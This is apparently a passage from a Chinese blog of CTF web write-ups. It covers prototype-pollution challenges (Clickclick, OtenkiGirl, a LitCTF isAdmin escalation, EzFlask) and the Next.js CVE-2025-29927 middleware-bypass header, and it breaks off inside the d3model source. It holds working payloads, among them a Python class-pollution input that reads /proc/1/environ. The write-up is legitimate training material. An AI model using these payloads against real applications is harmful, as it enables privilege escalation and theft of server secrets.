<h4 id="Mini-L-CTF-2025-西电-CTF-终端-Clickclick"><a href="#Mini-L-CTF-2025-西电-CTF-终端-Clickclick" class="headerlink" title="Mini L-CTF 2025 - 西电 CTF 终端 Clickclick"></a><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/18?challenge=822">Mini L-CTF 2025 - 西电 CTF 终端</a> Clickclick</h4><p>源码拉到最下面可以看到：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Qt</span>(o, <span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">w</span>(e) &gt;= <span class="number">1e3</span> &amp;&amp; <span class="title function_">i</span>(l)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"> h.<span class="property">textContent</span> = <span class="string">`</span></span><br><span class="line"><span class="string">      if ( req.body.point.amount == 0 || req.body.point.amount == null) &#123; delete req.body.point.amount &#125;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>就能知道10000次以后会输出textContent的内容（实在不行也可以直接丢个AI的，试过是可以分析出来10000次后面输出这个的）</p>
<p>然后看到：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">    <span class="title function_">ce</span>(e, !<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">const</span> r = <span class="string">&quot;/update-amount&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="title class_">Wr</span>(e, <span class="string">&quot;count&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="title class_">Jr</span>();</span><br><span class="line">    <span class="keyword">var</span> s = <span class="title function_">mn</span>();</span><br><span class="line">    s.<span class="property">__click</span> = [yn, n, r];</span><br><span class="line">    <span class="keyword">var</span> o = <span class="title class_">Pt</span>(s);</span><br><span class="line">    <span class="title class_">Tr</span>( <span class="function">() =&gt;</span> $r(o, <span class="string">`count is <span class="subst">$&#123;n() ?? <span class="string">&quot;&quot;</span>&#125;</span>`</span>)),</span><br><span class="line">    <span class="title function_">ct</span>(t, s),</span><br><span class="line">    <span class="title function_">he</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里每点击50次会向/update-amount发一次包，更新后端数据，而且这里更新不是add而是set，又结合 if ( req.body.point.amount == 0 || req.body.point.amount == null) { delete req.body.point.amount }，可以看到amount一开始就是0或者是已经被删除了，而且这个路径看起来很像原型链污染，那么想要改变他的值可以尝试污染amount的值，让他变成10000</p>
<p>那么怎么知道原链呢，看看事件监听器那边的click</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>:<span class="string">&quot;set&quot;</span>,</span><br><span class="line">  <span class="string">&quot;point&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;10000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-OtenkiGirl"><a href="#BUUCTF在线评测-OtenkiGirl" class="headerlink" title="BUUCTF在线评测 OtenkiGirl"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]OtenkiGirl">BUUCTF在线评测</a> OtenkiGirl</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17767089.html">NewStar2023 web-week3-wp - Eddie_Murphy - 博客园</a></p>
<p>这里有一个值得注意的点：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line"><span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br></pre></td></tr></table></figure>
<p>这是什么意思呢，结合注释能看出来，</p>
<p>首先声明了一个变量<code>minTimestamp</code>，将其初始化为<code>CONFIG.min_public_time</code>或<code>DEFAULT_CONFIG.min_public_time</code>的日期对象的时间戳。这里的<code>CONFIG.min_public_time</code>和<code>DEFAULT_CONFIG.min_public_time</code>表示了movie的最小公开时间。</p>
<p>接下来，代码使用<code>Math.max</code>函数将<code>timestamp</code>与<code>minTimestamp</code>比较，并返回较大的值。<code>timestamp</code>是另一个变量，表示某个数据的时间戳。通过执行这个比较操作，可以确保<code>timestamp</code>的值不早于<code>minTimestamp</code>，也就是不早于movie的最小公开时间</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">	<span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">	<span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">	<span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    </span><br><span class="line">		<span class="attr">&quot;min_public_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1001-01-01&quot;</span>  </span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="LitCTF-2025-多重宇宙日记-NSSCTF"><a href="#LitCTF-2025-多重宇宙日记-NSSCTF" class="headerlink" title="[LitCTF 2025]多重宇宙日记 | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6801">[LitCTF 2025]多重宇宙日记 | NSSCTF</a></h4><p>源码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 更新表单的JS提交</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;profileUpdateForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;updateStatus&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">        statusEl.<span class="property">textContent</span> = <span class="string">&#x27;正在更新...&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.<span class="property">target</span>);</span><br><span class="line">        <span class="keyword">const</span> settingsPayload = &#123;&#125;;</span><br><span class="line">        <span class="comment">// 构建 settings 对象，只包含有值的字段</span></span><br><span class="line">        <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="property">theme</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>)) settingsPayload.<span class="property">language</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>);</span><br><span class="line">        <span class="comment">// ...可以添加其他字段</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">settings</span>: settingsPayload &#125;) <span class="comment">// 包装在 &quot;settings&quot;键下</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;成功: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;错误: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;请求失败: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送原始JSON的函数</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendRawJson</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> rawJson = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonSettings&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">        statusEl.<span class="property">textContent</span> = <span class="string">&#x27;正在发送...&#x27;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> parsedJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawJson); <span class="comment">// 确保是合法的JSON</span></span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(parsedJson) <span class="comment">// 直接发送用户输入的JSON</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;成功: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                 <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;错误: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">             statusEl.<span class="property">textContent</span> = <span class="string">&#x27;请求失败或JSON无效: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提示键值在setting下，又需要管理员权限，所以payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;settings&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-EzFlask"><a href="#BUUCTF在线评测-EzFlask" class="headerlink" title="BUUCTF在线评测 EzFlask"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask">BUUCTF在线评测</a> EzFlask</h4><p>开头直接给源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到这一段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
<p>很明显的python的原型链污染</p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;../../../proc/1/environ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>（其中<code>__init__</code>用unicode编码了一下，其实你也可以将其他的也编码）</p>
<p>在注册页面污染后，GET访问首页就可以了</p>
<hr>
<h2 id="CVE说是"><a href="#CVE说是" class="headerlink" title="CVE说是"></a>CVE说是</h2><h3 id="LitCTF-2025-nest-js-NSSCTF"><a href="#LitCTF-2025-nest-js-NSSCTF" class="headerlink" title="LitCTF 2025]nest_js | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6786">LitCTF 2025]nest_js | NSSCTF</a></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CVE-Lemon/p/18789173">CVE-2025-29927 Next.js 中间件权限绕过漏洞复现 - CVE-柠檬i - 博客园</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</span><br></pre></td></tr></table></figure>
<h3 id="D-3-CTF-2025-d3model"><a href="#D-3-CTF-2025-d3model" class="headerlink" title="D^3 CTF 2025 d3model"></a>D^3 CTF 2025 d3model</h3><p>源码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span 